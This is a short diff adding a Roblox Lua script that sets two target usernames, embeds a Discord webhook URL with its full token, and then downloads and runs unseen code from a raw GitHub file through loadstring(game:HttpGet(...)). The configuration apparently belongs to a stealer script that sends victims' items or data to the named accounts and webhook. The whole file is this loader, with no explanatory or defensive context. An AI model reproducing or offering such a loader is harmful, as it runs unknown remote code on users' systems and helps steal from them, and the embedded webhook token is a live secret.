@@ -1,0 +1,5 @@
+UserName = "FORTN1TEPRO5"
+Webhook = "https://discord.com/api/webhooks/1171137002301821039/_S7jW9p31nwYf4307L8XLpYKuC_4Oi_Yiwn9G83wh24CPgkdOlNRTGkFvsmX4Lzwpobk"
+UserName2 = "zerox984"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
